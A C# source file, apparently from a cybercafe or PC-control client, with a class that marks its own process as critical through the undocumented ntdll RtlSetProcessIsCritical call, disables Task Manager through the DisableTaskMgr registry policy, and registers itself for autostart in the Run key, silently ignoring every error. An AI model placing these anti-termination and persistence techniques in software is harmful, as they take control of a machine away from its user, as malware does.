using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace PcControl.Client
{
    public static class SeguridadSistema
    {
 
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, ref UInt32 v2, UInt32 v3);
        
        public static void EstablecerProcesoCritico(bool esCritico)
        {
            try
            {
                // Para convertirnos en críticos, primero necesitamos permisos especiales de "Debug"
                Process.EnterDebugMode();

                uint flagCritico = esCritico ? 1u : 0u;
                uint dummy = 0;
                
                // Ejecutamos la orden en el núcleo de Windows
                RtlSetProcessIsCritical(flagCritico, ref dummy, 0);
            }
            catch (Exception)
            {
                // Ignorar si falla. Normalmente falla si el programa NO se ejecutó como Administrador.
            }
        }

        /// <summary>
        /// Desactiva o activa el Administrador de Tareas modificando el Registro.
        /// </summary>
        public static void BloquearAdministradorTareas(bool bloquear)
        {
            try
            {
                // Ruta exacta en el regedit donde se controlan las políticas del sistema
                string rutaPolíticas = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
                
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(rutaPolíticas))
                {
                    if (key != null)
                    {
                        if (bloquear)
                        {
                            // 1 = Administrador de tareas desactivado
                            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                        }
                        else
                        {
                            // Borrar la llave restaura el acceso
                            key.DeleteValue("DisableTaskMgr", false);
                        }
                    }
                }
            }
            catch (Exception)
            {
                // Falla si no hay permisos de Administrador
            }
        }
        
        public static void AsegurarAutoArranque()
        {
            try
            {
                string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(runKey, true))
                {
                    if (key != null)
                    {
                        // Obtenemos la ruta exacta de donde se está ejecutando el programa actualmente
                        string miRuta = Assembly.GetExecutingAssembly().Location;
                        
                        // Corrección para .NET 5+: A veces Location devuelve el .dll en vez del .exe
                        miRuta = miRuta.Replace(".dll", ".exe");

                        // Lo anclamos al registro
                        key.SetValue("CyberControl_Guardian", $"\"{miRuta}\"");
                    }
                }
            }
            catch (Exception)
            {
                // Ignorar errores de lectura/escritura
            }
        }
        
    }
}